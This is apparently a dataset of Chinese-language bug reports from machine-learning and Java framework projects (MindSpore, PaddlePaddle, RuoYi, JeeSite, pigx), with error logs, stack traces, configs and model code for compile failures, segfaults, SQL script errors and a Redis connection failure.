BidirectionGRU在pynative模式下报错 `mindspore-assistant`,"BidirectionGRU在pynative模式下报错 环境信息 硬件环境: /device ascend910 notebook 软件环境: -- MindSpore version : r1.3.0 -- Python version : Python 3.7.5 -- GCC/Compiler version : 7.3.0 执行模式: /mode pynative (报错) /mode graph (不报错) DetectionNetwork模型调用BidirectionGRU: BidirectionGRU: 模型在pynative模式下调用BidirectionGRU(来自modelzoo) 报错 ssh://ma-user@dev-modelarts-cnsouth222.cloudbrain2.pcl.ac.cn:30230/usr/bin/python -u /home/ma-user/work/BertBasedCorrectionModels_v3/model_files/train.py [WARNING] ME(16803:281473420517392,MainProcess):2022-03-17-10:54:58.483.236 [mindspore/run_check/_check_version.py:267] Using custom Ascend 910 AI software package path, package version checking is skipped, please make sure Ascend 910 AI software package version is supported, you can reference to the installation guidelines https://www.mindspore.cn/install [WARNING] ME(16803:281473420517392,MainProcess):2022-03-17-10:54:58.637.204 [mindspore/run_check/_check_version.py:362] Can not find tbe op implement(need by mindspore-ascend), please check if you have set env PYTHONPATH, you can reference to the installation guidelines https://www.mindspore.cn/install /home/ma-user/work/BertBasedCorrectionModels_v3/model_files 100%|██████████████████████████████████████████| 8/8 [00:00&lt;00:00, 16853.05it/s] [WARNING] DEVICE(16803,fffec0ff91f0,python):2022-03-17-10:56:37.162.406 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[DropoutGenMask]reduce precision from int64 to int32 [WARNING] DEVICE(16803,fffec0ff91f0,python):2022-03-17-10:56:37.376.813 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[DropoutGenMask]reduce precision from int64 to int32 [WARNING] PYNATIVE(16803,ffffa33e6010,python):2022-03-17-10:56:43.277.336 [mindspore/ccsrc/pipeline/pynative/pynative_execute.cc:2498] CheckAlreadyRun] The construct of running cell is dynamic and the input info of this cell has changed, forward process will run again [WARNING] DEVICE(16803,fffec0ff91f0,python):2022-03-17-10:56:44.759.911 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[DropoutGenMask]reduce precision from int64 to int32 [WARNING] DEVICE(16803,fffec0ff91f0,python):2022-03-17-10:56:44.871.357 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[DropoutGenMask]reduce precision from int64 to int32 [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.303.653 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear.weight [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.305.014 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear.bias [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.305.972 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear_debug.weight [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.306.925 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear_debug.bias [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.307.878 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear_debug2.weight [WARNING] OPTIMIZER(16803,ffffa33e6010,python):2022-03-17-10:56:53.308.027 [mindspore/ccsrc/frontend/optimizer/ad/kpynative.cc:1016] SetOutput] Weight is not used in network, weight: linear_debug2.bias [ERROR] KERNEL(16803,fffec0ff91f0,python):2022-03-17-10:57:32.563.812 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:99] TbeOpParallelBuild] task compile Failed, task id:31, cause:TBEException:ERROR: Traceback (most recent call last): File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 156, in build_op optune_opt_list=op_tune_list) File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1179, in build_single_op compile_info = call_op() File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1167, in call_op opfunc(*inputs, *outputs, *attrs, **kwargs) File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/tbe/common/utils/para_check.py"", line 537, in _in_wrapper return func(*args, **kwargs) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data.py"", line 161, in trans_data trans_data_positive_source_ntc.trans_data_positive_source_ntc(src, dst, src_format, dst_format, kernel_name) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 858, in trans_data_positive_source_ntc tiling_params = _get_tiling_params_func(args) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 381, in _get_tiling_params_func in_format_new, out_format_new) = _renew_input_output_shape_format(in_shape, out_shape, src_format, dst_format) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 113, in _renew_input_output_shape_format axis_n, axis_c, axis_h, axis_w = in_shape ValueError: not enough values to unpack (expected 4, got 2) During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 212, in result = compile_with_json(in_args) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 206, in compile_with_json ret = build_op(op_build, json_str, None) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 162, in build_op raise RuntimeError(e) RuntimeError: not enough values to unpack (expected 4, got 2) input_args: {""SocInfo"": {""autoTilingMode"": ""NO_TUNE"", ""coreNum"": """", ""coreType"": """", ""l1Fusion"": ""false"", ""l2Fusion"": ""false"", ""l2Mode"": ""2"", ""op_debug_level"": """", ""op_impl_mode"": """", ""op_impl_mode_list"": [], ""socVersion"": ""Ascend910ProA""}, ""impl_path"": """", ""op_info"": {""Type"": ""TransData"", ""attr_desc"": [""NCHW"", ""FRACTAL_Z"", 1], ""attrs"": [{""name"": ""src_format"", ""valid"": true, ""value"": ""NCHW""}, {""name"": ""dst_format"", ""valid"": true, ""value"": ""FRACTAL_Z""}, {""name"": ""groups"", ""valid"": true, ""value"": 1}], ""full_name"": ""Default/TransData-op1255"", ""gen_model"": ""single"", ""graph_id"": 850, ""inputs"": [[{""addr_type"": 0, ""dtype"": ""float16"", ""format"": ""NCHW"", ""name"": ""src_0"", ""ori_format"": ""NCHW"", ""ori_shape"": [768, 1152], ""param_type"": ""required"", ""range"": [[768, 768], [1152, 1152]], ""shape"": [768, 1152], ""valid"": true}]], ""is_dynamic_shape"": false, ""kernel_name"": ""TransData_5615045763494658735_0"", ""module_name"": ""impl.trans_data"", ""name"": ""trans_data"", ""op_tune_list"": """", ""op_tune_switch"": ""off"", ""outputs"": [[{""addr_type"": 0, ""dtype"": ""float16"", ""format"": ""FRACTAL_Z"", ""name"": ""dst"", ""ori_format"": ""NCHW"", ""ori_shape"": [768, 1152], ""param_type"": ""required"", ""range"": [[55296, 55296], [1, 1], [16, 16], [16, 16]], ""shape"": [55296, 1, 16, 16], ""valid"": true}]], ""pass_list"": ""invalid"", ""py_module_path"": ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe"", ""rl_tune_list"": """", ""rl_tune_switch"": ""off"", ""socVersion"": ""Ascend910ProA""}, ""platform"": ""TBE"", ""reset_op_info"": [{""type"": ""clear_vector"", ""bin_path"": ""./kernel_meta/vector_random_buff.o"", ""kernel_name"": ""vector_random_buff""}, {""type"": ""clear_cube"", ""bin_path"": ""./kernel_meta/cube_random_buff.o"", ""kernel_name"": ""cube_random_buff""}]} trace: Traceback (most recent call last): File ""/home/ma-user/work/BertBasedCorrectionModels_v3/model_files/train.py"", line 171, in run_csc() File ""/home/ma-user/work/BertBasedCorrectionModels_v3/model_files/train.py"", line 156, in run_csc do_train(ds_train, netwithloss) File ""/home/ma-user/work/BertBasedCorrectionModels_v3/model_files/train.py"", line 72, in do_train model.train(epoch=1, train_dataset=dataset, callbacks=[LossMonitor(), ckpoint_cb], dataset_sink_mode=False) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 433, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/train/model.py"", line 558, in _train_process outputs = self._train_network(*next_element) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in call output = self.run_construct(cast_inputs, kwargs) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py"", line 397, in construct loss = F.depend(loss, self.optimizer(grads)) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 404, in call output = self.run_construct(cast_inputs, kwargs) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 345, in run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/optim/adam.py"", line 500, in construct gradients, self.decay_flags, self.optim_filter) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 547, in call return tuple(map(hypermap, *args_list)) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 546, in call return func(*args_list) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/ops/composite/base.py"", line 446, in call output = fn(*args) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/nn/optim/adam.py"", line 83, in _update_run_op next_param = F.depend(next_param, F.assign(param, op_cast(next_param, F.dtype(param)))) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 247, in call return _run_op(self, self.name, args) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 649, in _run_op output = real_run_op(obj, op_name, args) RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:99 TbeOpParallelBuild] task compile Failed, task id:31, cause:TBEException:ERROR: Traceback (most recent call last): File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 156, in build_op optune_opt_list=op_tune_list) File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1179, in build_single_op compile_info = call_op() File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/te_fusion/fusion_manager.py"", line 1167, in call_op opfunc(*inputs, *outputs, *attrs, **kwargs) File ""/home/ma-user/Ascend/ascend-toolkit/5.0.2.1/arm64-linux/fwkacllib/python/site-packages/tbe/common/utils/para_check.py"", line 537, in _in_wrapper return func(*args, **kwargs) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data.py"", line 161, in trans_data trans_data_positive_source_ntc.trans_data_positive_source_ntc(src, dst, src_format, dst_format, kernel_name) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 858, in trans_data_positive_source_ntc tiling_params = _get_tiling_params_func(args) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 381, in _get_tiling_params_func in_format_new, out_format_new) = _renew_input_output_shape_format(in_shape, out_shape, src_format, dst_format) File ""/home/ma-user/Ascend/ascend-toolkit/latest/opp/op_impl/built-in/ai_core/tbe/impl/trans_data_positive_source_ntc.py"", line 113, in _renew_input_output_shape_format axis_n, axis_c, axis_h, axis_w = in_shape ValueError: not enough values to unpack (expected 4, got 2) During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 212, in result = compile_with_json(in_args) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 206, in compile_with_json ret = build_op(op_build, json_str, None) File ""/home/ma-user/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/tbe_compiler/compiler.py"", line 162, in build_op raise RuntimeError(e) RuntimeError: not enough values to unpack (expected 4, got 2) input_args: {""SocInfo"": {""autoTilingMode"": ""NO_TUNE"", ""coreNum"": """", ""coreType"": """", ""l1Fusion"": ""false"", ""l2Fusion"": ""false"", ""l2Mode"": ""2"", ""op_debug_level"": """", ""op_impl_mode"": """", ""op_impl_mode_list"": [], ""socVersion"": ""Ascend910ProA""}, ""impl_path"": """", ""op_info"": {""Type"": ""TransData"", ""attr_desc"": [""NCHW"", ""FRACTAL_Z"", 1], ""attrs"": [{""name"": ""src_format"", ""valid"": true, ""value"": ""NCHW""}, {""name"": ""dst_format"", ""valid"": true, ""value"": ""FRACTAL_Z""}, {""name"": ""groups"", ""valid"": true, ""value"": 1}], ""full_name"": ""Default/TransData-op1255"", ""gen_model"": ""single"", ""graph_id"": 850, ""inputs"": [[{""addr_type"": 0, ""dtype"": ""float16"", ""format"": ""NCHW"", ""name"": ""src_0"", ""ori_format"": ""NCHW"", ""ori_shape"": [768, 1152], ""param_type"": ""required"", ""range"": [[768, 768], [1152, 1152]], ""shape"": [768, 1152], ""valid"": true}]], ""is_dynamic_shape"": false, ""kernel_name"": ""TransData_5615045763494658735_0"", ""module_name"": ""impl.trans_data"", ""name"": ""trans_data"", ""op_tune_list"": """", ""op_tune_switch"": ""off"", ""outputs"": [[{""addr_type"": 0, ""dtype"": ""float16"", ""format"": ""FRACTAL_Z"", ""name"": ""dst"", ""ori_format"": ""NCHW"", ""ori_shape"": [768, 1152], ""param_type"": ""required"", ""range"": [[55296, 55296], [1, 1], [16, 16], [16, 16]], ""shape"": [55296, 1, 16, 16], ""valid"": true}]], ""pass_list"": ""invalid"", ""py_module_path"": ""/usr/local/Ascend/opp/op_impl/built-in/ai_core/tbe"", ""rl_tune_list"": """", ""rl_tune_switch"": ""off"", ""socVersion"": ""Ascend910ProA""}, ""platform"": ""TBE"", ""reset_op_info"": [{""type"": ""clear_vector"", ""bin_path"": ""./kernel_meta/vector_random_buff.o"", ""kernel_name"": ""vector_random_buff""}, {""type"": ""clear_cube"", ""bin_path"": ""./kernel_meta/cube_random_buff.o"", ""kernel_name"": ""cube_random_buff""}]} trace: [ERROR] DEVICE(16803,fffec0ff91f0,python):2022-03-17-10:57:32.657.379 [mindspore/ccsrc/runtime/device/ascend/ascend_memory_manager.cc:108] FreeDeviceMemory] rtFree mem size[33285996544] fail, ret[507899] Process finished with exit code 1   <code>: class DetectionNetwork(nn.Cell): def __init__(self, config, batch_size, is_training): super().__init__() self.config = config self.rnn = BidirectionGRU(gru_cfg, batch_size).to_float(mstype.float16) self.sigmoid = nn.Sigmoid() self.linear = nn.Dense(self.config.hidden_size, 1) self.cast = P.Cast() self.reshape = P.Reshape() self.transpose = P.Transpose() def construct(self, hidden_states): hidden_states = self.cast(hidden_states, ms.float16) # if not O3 hidden_states = self.transpose(hidden_states, (1, 0, 2)) out, _ = self.rnn(hidden_states) out = self.transpose(out, (1, 0, 2)) prob = self.linear(out.astype(""float32"")) # if not O3 prob = self.sigmoid(prob) return prob class BidirectionGRU(nn.Cell): ''' BidirectionGRU model Args: config: config of network ''' def __init__(self, config, batch_size): super(BidirectionGRU, self).__init__() self.batch_size = batch_size self.embedding_size = config.encoder_embedding_size self.hidden_size = config.hidden_size self.weight_i, self.weight_h, self.bias_i, self.bias_h, self.init_h = gru_default_state(self.batch_size, self.embedding_size, self.hidden_size) self.weight_bw_i, self.weight_bw_h, self.bias_bw_i, self.bias_bw_h, self.init_bw_h = \ gru_default_state(self.batch_size, self.embedding_size, self.hidden_size) self.reverse = P.ReverseV2(axis=[1]) self.concat = P.Concat(axis=2) self.squeeze = P.Squeeze(axis=0) self.rnn = P.DynamicGRUV2() self.text_len = config.max_length self.cast = P.Cast() def construct(self, x): ''' BidirectionGRU construction Args: x(Tensor): BidirectionGRU input Returns: output(Tensor): rnn output hidden(Tensor): hidden state ''' x = self.cast(x, mstype.float16) y1, _, _, _, _, _ = self.rnn(x, self.weight_i, self.weight_h, self.bias_i, self.bias_h, None, self.init_h) bw_x = self.reverse(x) y1_bw, _, _, _, _, _ = self.rnn(bw_x, self.weight_bw_i, self.weight_bw_h, self.bias_bw_i, self.bias_bw_h, None, self.init_bw_h) y1_bw = self.reverse(y1_bw) output = self.concat((y1, y1_bw)) hidden = self.concat((y1[self.text_len-1:self.text_len:1, ::, ::], y1_bw[self.text_len-1:self.text_len:1, ::, ::])) hidden = self.squeeze(hidden) return output, hidden"
使用梯度裁剪出core,"你好，我在pull paddle最新代码并编译后，尝试在 Paddle/python/paddle/fluid/tests/book/test_label_semantic_roles.py 这个例子中添加梯度裁剪。我在第115行，尝试加入 fluid.clip.set_gradient_clip(clip=fluid.clip.GradientClipByGlobalNorm(clip_norm=1.0))，但是运行会出现下面的错误。 我试了另一种方式的梯度裁剪，即在第55-60行中，加入梯度裁剪 predicate_embedding = fluid.layers.embedding( input=predicate, size=[pred_dict_len, word_dim], dtype='float32', is_sparse=IS_SPARSE, param_attr=fluid.ParamAttr(name = 'vemb', gradient_clip=fluid.clip.GradientClipByValue(max=0.01, min=-0.05))) 结果会报类似的错误。 看错误类型似乎是涉及到内存管理，辛苦追查一下。   <code>: *** Aborted at 1522150472 (unix time) try ""date -d @1522150472"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 25525 (TID 0x7f98984ad700) from PID 0; stack trace: *** @ 0x7f989808b390 (unknown) @ 0x7f98636ad6a7 paddle::memory::detail::MetadataCache::load() @ 0x7f98636ae240 paddle::memory::detail::MemoryBlock::split() @ 0x7f98636ac2c2 _ZN6paddle6memory6detail14BuddyAllocator12SplitToAllocESt23_Rb_tree_const_iteratorISt5tupleIJmmPvEEEm @ 0x7f98636ac7fd paddle::memory::detail::BuddyAllocator::Alloc() @ 0x7f98636aad50 paddle::memory::Alloc&lt;&gt;() @ 0x7f986360871a paddle::framework::Tensor::mutable_data() @ 0x7f986373468a paddle::framework::Tensor::mutable_data&lt;&gt;() @ 0x7f9863a92477 paddle::operators::ReduceKernel&lt;&gt;::Compute() @ 0x7f9863db76b4 paddle::framework::OperatorWithKernel::RunImpl() @ 0x7f9863db4a68 paddle::framework::OperatorBase::Run() @ 0x7f98636b3f2c paddle::framework::Executor::RunPreparedContext() @ 0x7f98636b54a7 paddle::framework::Executor::Run() @ 0x7f98636215a3 _ZZN8pybind1112cpp_function10initializeIZNS0_C4IvN6paddle9framework8ExecutorEIRKNS4_11ProgramDescEPNS4_5ScopeEibbEINS_4nameENS_9is_methodENS_7siblingEEEEMT0_FT_DpT1_EDpRKT2_EUlPS5_S8_SA_ibbE_vISO_S8_SA_ibbEISB_SC_SD_EEEvOSF_PFSE_SH_ESN_ENUlRNS_6detail13function_callEE1_4_FUNESV_ @ 0x7f986361dee4 pybind11::cpp_function::dispatcher() @ 0x4c37ed PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c16e7 PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c1e6f PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c16e7 PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4c16e7 PyEval_EvalFrameEx @ 0x4c136f PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4d55f3 (unknown) @ 0x4a577e PyObject_Call @ 0x4bed3d PyEval_EvalFrameEx @ 0x4b9ab6 PyEval_EvalCodeEx @ 0x4d54b9 (unknown) @ 0x4eebee (unknown) Segmentation fault *** Aborted at 1522152073 (unix time) try ""date -d @1522152073"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGSEGV (@0x0) received by PID 25756 (TID 0x7f3f6a4c3700) from PID 0; stack trace: *** @ 0x7f4136c6c390 (unknown) @ 0x7f410228e6a7 paddle::memory::detail::MetadataCache::load() @ 0x7f410228edf3 paddle::memory::detail::MemoryBlock::type() @ 0x7f410228da91 paddle::memory::detail::BuddyAllocator::Free() @ 0x7f410228bf10 paddle::memory::Free&lt;&gt;() @ 0x7f41021df01e paddle::framework::Tensor::PlaceholderImpl&lt;&gt;::~PlaceholderImpl() @ 0x7f41021e5fd6 std::_Sp_counted_base&lt;&gt;::_M_release() @ 0x7f41021e62a8 paddle::framework::Variable::PlaceholderImpl&lt;&gt;::~PlaceholderImpl() @ 0x7f41029a98bc paddle::framework::Scope::~Scope() @ 0x7f41029a99ea _ZNSt17_Function_handlerIFSt10unique_ptrINSt13__future_base12_Result_baseENS2_8_DeleterEEvENS1_12_Task_setterIS0_INS1_7_ResultIS0_IN6paddle8platform13EnforceNotMetESt14default_deleteISA_EEEES3_ESt12_Bind_simpleIFSt17reference_wrapperIZNS8_9framework10ThreadPool18RunAndGetExceptionIZNSI_5Scope11DeleteScopeEPSL_EUlvE_EESt6futureISD_ET_EUlvE_EvEESD_EEE9_M_invokeERKSt9_Any_data @ 0x7f41028430ee std::__future_base::_State_baseV2::_M_do_set() @ 0x7f4136c69a99 __pthread_once_slow @ 0x7f41029a92a7 _ZNSt13__future_base11_Task_stateIZN6paddle9framework10ThreadPool18RunAndGetExceptionIZNS2_5Scope11DeleteScopeEPS5_EUlvE_EESt6futureISt10unique_ptrINS1_8platform13EnforceNotMetESt14default_deleteISB_EEET_EUlvE_SaIiEFSE_vEE6_M_runEv @ 0x7f41029ae804 paddle::framework::ThreadPool::TaskLoop() @ 0x7f41311f4c80 (unknown) @ 0x7f4136c626ba start_thread @ 0x7f413699841d clone @ 0x0 (unknown) Segmentation fault"
"[CT[MS][parse]The error information is modified, shape (-1,) to shape (None,)","报错信息更改,shape (-1,) 变为shape (None,) / 硬件环境: /device ascend : -- MindSpore version :master-45783 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest -s parse/test_parser_tensor_dynamic_index_set.py::test_parser_dynamic_input_index_true_006_false case pass   <code>: def test_parser_dynamic_input_index_true_006_false(): class Net(nn.Cell): def __init__(self): super().__init__() self.unique = ops.Unique() self.cast = ops.Cast() self.value = Tensor([1, 1, 2]) def construct(self, x): value = self.unique(self.value)[0] value = self.cast(value, mstype.float32) x[True] = value return x class TorchNet(nn_torch.Module): def __init__(self): super().__init__() def forward(self, x): x.requires_grad = False x[True] = torch.unique(torch.tensor([1, 1, 2])) x.requires_grad = True return x net_ms = Net() dynamic_input = Tensor(shape=(None, ), dtype=mstype.float32) net_ms.set_inputs(dynamic_input) net_pt = TorchNet() input_np = np.random.randn(2, ).astype(np.float32) fact = ParserFactory(net_ms, net_pt, input_np) fact.forward_cmp() with pytest.raises(ValueError) as e: fact.grad_mindspore_impl() &gt; assert ""could not broadcast input array from shape (-1,) to (2,)"" in str(e.value) &gt; assert ""could not broadcast input array from shape (-1,) to (2,)"" in str(e.value) E AssertionError: assert 'could not broadcast input array from shape (-1,) to (2,)' in 'could not broadcast input array from shape (None,) to (2,)' E + where 'could not broadcast input array from shape (None,) to (2,)' = str(ValueError('could not broadcast input array from shape (None,) to (2,)')) E + where ValueError('could not broadcast input array from shape (None,) to (2,)') = &lt;ExceptionInfo ValueError('could not broadcast input array from shape (None,) to (2,)') tblen=8&gt;.value"
cann't set name of some fluid layers,"there is no way so set of , which is supported in other layers like: now, i found these layers is not supported: topk softmax concat dropout (maybe there are other layers that neither support name setting) test code: results:   <code>: name fluid.layers.topk fluid.layers.conv2d import sys import numpy as np def get_data(shape=[1, 1024]): sz = reduce(lambda x,y: x*y, shape) d = range(sz) data = 1 + np.array(d, dtype='float32').reshape(shape) return data def test_topk(): import paddle.fluid as fluid data = get_data() x = fluid.layers.data(name='x', shape=data.shape[1:], dtype='float32') out, _ = fluid.layers.topk(input=x, k=1, name='topk') place = fluid.CPUPlace() exe = fluid.Executor(place) fetch_list = [out] exe.run(fluid.default_startup_program()) program = fluid.default_main_program() #for v in program.list_vars(): # print v y = exe.run( program=program, feed={'x': data}, fetch_list=fetch_list) print('results:') print y test_topk() $&gt;python test_topk.py Traceback (most recent call last): File ""test_topk.py"", line 39, in &lt;module&gt; test_topk() File ""test_topk.py"", line 19, in test_topk out, _ = fluid.layers.topk(input=x, k=1, name='topk') TypeError: topk() got an unexpected keyword argument 'name'"
代码生成 500,1.我新增了一个表名为wwq_aq的表，设计表如下： Referrer Policy: strict-origin-when-cross-origin   <code>: # 代码生成 gen: # 作者 author: wwq # 默认生成包路径 system 需改成自己的模块名称 如 system monitor tool packageName: com.ruoyi.system # 自动去除表前缀，默认是false autoRemovePre: false # 表前缀（生成类名不会包含表前缀，多个用逗号分隔） tablePrefix: wwq_
mssql项目运行报错,1、数据初始化脚本报错 /* Create Indexes <em>/ CREATE INDEX [idx_gen_table_ptn] ON [js_gen_table] () CREATE INDEX [idx_gen_table_column_tn] ON [js_gen_table_column] () Error executing: /</em> Create Indexes */ CREATE INDEX [idx_gen_table_ptn] ON [js_gen_table] () . Cause: java.sql.SQLException: ')' 附近有语法错误。 Error executing: CREATE INDEX [idx_gen_table_column_tn] ON [js_gen_table_column] () . Cause: java.sql.SQLException: ')' 附近有语法错误。 2、测试数据初始化报错 at com.jeesite.common.mybatis.interceptor.d.ALLATORIxDEMO(ll:119)   <code>: at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:150) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:141) at sun.reflect.GeneratedMethodAccessor175.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 110 common frames omitted
"文档""设置命令行参数""的修改",修改原因：使用v2 api后，不再使用来调用命令行参数。这些参数中的某些在中能继续使用，但另外一部分就已经失效了。 修改文件：有三个中文文件 使用案例 参数概述 细节描述 网页链接：develop分支的设置命令行参数   <code>: paddle train paddle init
"不同版本idea,报redis错误","环境信息 pigx版本: 3.11.0 是否修改包名: 否 专属版本新建的空模块，此模块不需要redis,idea2018启动正常，idea2019.2版本启动报错 2018版本显示日志如下： 2021-01-28 16:13:53.578 WARN 25480 --- [ main] s.o.SpringCloudSecurityAutoConfiguration : All Spring Cloud Security modules and starters are deprecated. They will be moved to individual projects in the next major release. 2021-01-28 16:13:53.850 INFO 25480 --- [ main] io.undertow : starting server: Undertow - 2.1.4.Final 2021-01-28 16:13:53.857 INFO 25480 --- [ main] org.xnio : XNIO version 3.8.0.Final 2021-01-28 16:13:53.865 INFO 25480 --- [ main] org.xnio.nio : XNIO NIO Implementation Version 3.8.0.Final 2021-01-28 16:13:53.903 INFO 25480 --- [ main] org.jboss.threads : JBoss Threads version 3.1.0.Final 2021-01-28 16:13:53.957 INFO 25480 --- [ main] o.s.b.w.e.undertow.UndertowWebServer : Undertow started on port(s) 6007 (http) 2021-01-28 16:13:53.973 INFO 25480 --- [ main] c.a.c.n.registry.NacosServiceRegistry : nacos registry, DEFAULT_GROUP land-gis-biz 192.168.62.1:6007 register finished 2021-01-28 16:13:55.461 INFO 25480 --- [ main] com.ztland.land.gis.GisApplication : Started GisApplication in 20.413 seconds (JVM running for 23.3) idea2019.2版本日志如下： 2021-01-28 16:14:26.226 INFO 14816 --- [ main] com.ztland.land.gis.GisApplication : Started GisApplication in 22.972 seconds (JVM running for 25.334) 2021-01-28 16:14:27.377 INFO 14816 --- [)-192.168.171.1] io.undertow.servlet : Initializing Spring DispatcherServlet 'dispatcherServlet' 2021-01-28 16:14:27.378 INFO 14816 --- [)-192.168.171.1] o.s.web.servlet.DispatcherServlet : Initializing Servlet 'dispatcherServlet' 2021-01-28 16:14:27.395 INFO 14816 --- [)-192.168.171.1] o.s.web.servlet.DispatcherServlet : Completed initialization in 17 ms 2021-01-28 16:14:32.261 WARN 14816 --- [oundedElastic-1] o.s.b.a.r.RedisReactiveHealthIndicator : Redis health check failed org.springframework.data.redis.RedisConnectionFailureException: Unable to connect to Redis; nested exception is io.lettuce.core.RedisConnectionException: Unable to connect to land-redis:6379 Caused by: io.lettuce.core.RedisConnectionException: Unable to connect to land-redis:6379 Caused by: java.net.UnknownHostException: land-redis   <code>: at 